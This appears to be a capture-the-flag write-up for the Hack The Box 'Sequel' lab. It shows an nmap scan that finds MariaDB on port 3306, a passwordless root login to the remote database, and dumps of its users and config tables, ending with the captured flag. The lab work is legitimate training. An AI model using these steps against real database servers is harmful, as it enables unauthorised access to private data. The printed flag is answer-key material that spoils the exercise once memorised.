# Sequel
![image](https://github.com/T6X3G/F.NS357_Machine-s/assets/110654108/80cf044d-0c11-4bb5-a4e1-57be3065c05f)

1) During our scan, which port do we find serving MySQL?
`3306`

2) What community-developed MySQL version is the target running?

  `MariaDb`

3) When using the MySQL command line client, what switch do we need to use in order to specify a login username?
  ` -u ` 

```
┌──(melle㉿tuguldur)-[~/Downloads]
└─$ ping 10.129.199.243     
PING 10.129.199.243 (10.129.199.243) 56(84) bytes of data.
64 bytes from 10.129.199.243: icmp_seq=1 ttl=63 time=211 ms
64 bytes from 10.129.199.243: icmp_seq=2 ttl=63 time=211 ms
^C
--- 10.129.199.243 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1003ms
rtt min/avg/max/mdev = 211.118/211.185/211.253/0.067 ms

```
```
┌──(melle㉿tuguldur)-[~/Downloads]
└─$ sudo nmap -sC -sV 10.129.199.243
[sudo] password for melle: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-22 11:52 CDT
Nmap scan report for 10.129.199.243
Host is up (0.33s latency).
Not shown: 999 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
3306/tcp open  mysql?
| mysql-info: 
|   Protocol: 10
|   Version: 5.5.5-10.3.27-MariaDB-0+deb10u1
|   Thread ID: 66
|   Capabilities flags: 63486
|   Some Capabilities: Speaks41ProtocolNew, ConnectWithDatabase, Speaks41ProtocolOld, SupportsCompression, IgnoreSigpipes, SupportsLoadDataLocal, SupportsTransactions, DontAllowDatabaseTableColumn, InteractiveClient, Support41Auth, LongColumnFlag, ODBCClient, IgnoreSpaceBeforeParenthesis, FoundRows, SupportsMultipleStatments, SupportsMultipleResults, SupportsAuthPlugins
|   Status: Autocommit
|   Salt: H*7s_bPKc4w~1v!?Wxwm
|_  Auth Plugin Name: mysql_native_password

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 214.76 seconds
```
![image](https://github.com/T6X3G/F.NS357_Machine-s/assets/110654108/b1c21182-5f0a-445a-b035-c7a16a211c5c)
```
┌──(melle㉿tuguldur)-[~/Downloads]
└─$ mysql -u root -h 10.129.199.243
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 59
Server version: 10.3.27-MariaDB-0+deb10u1 Debian 10

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| htb                |
| information_schema |
| mysql              |
| performance_schema |
+--------------------+
4 rows in set (0.214 sec)

```
![image](https://github.com/T6X3G/F.NS357_Machine-s/assets/110654108/674f3aa2-c947-4fd0-8a60-67de69225932)
![image](https://github.com/T6X3G/F.NS357_Machine-s/assets/110654108/775088f7-74ab-40ce-89dc-7c113dbf58f2)
```
MariaDB [htb]> select *from users;
+----+----------+------------------+
| id | username | email            |
+----+----------+------------------+
|  1 | admin    | admin@sequel.htb |
|  2 | lara     | lara@sequel.htb  |
|  3 | sam      | sam@sequel.htb   |
|  4 | mary     | mary@sequel.htb  |
+----+----------+------------------+
4 rows in set (0.212 sec)

```
```
MariaDB [htb]> select *from config;
+----+-----------------------+----------------------------------+
| id | name                  | value                            |
+----+-----------------------+----------------------------------+
|  1 | timeout               | 60s                              |
|  2 | security              | default                          |
|  3 | auto_logon            | false                            |
|  4 | max_size              | 2M                               |
|  5 | flag                  | 7b4bec00d1a39e3dd4e021ec3d915da8 |
|  6 | enable_uploads        | false                            |
|  7 | authentication_method | radius                           |
+----+-----------------------+----------------------------------+
7 rows in set (0.211 sec)
```
![image](https://github.com/T6X3G/F.NS357_Machine-s/assets/110654108/5634c632-e246-4c85-a759-e9500300fd80)

##### Submit root flag 
` 7b4bec00d1a39e3dd4e021ec3d915da8 `








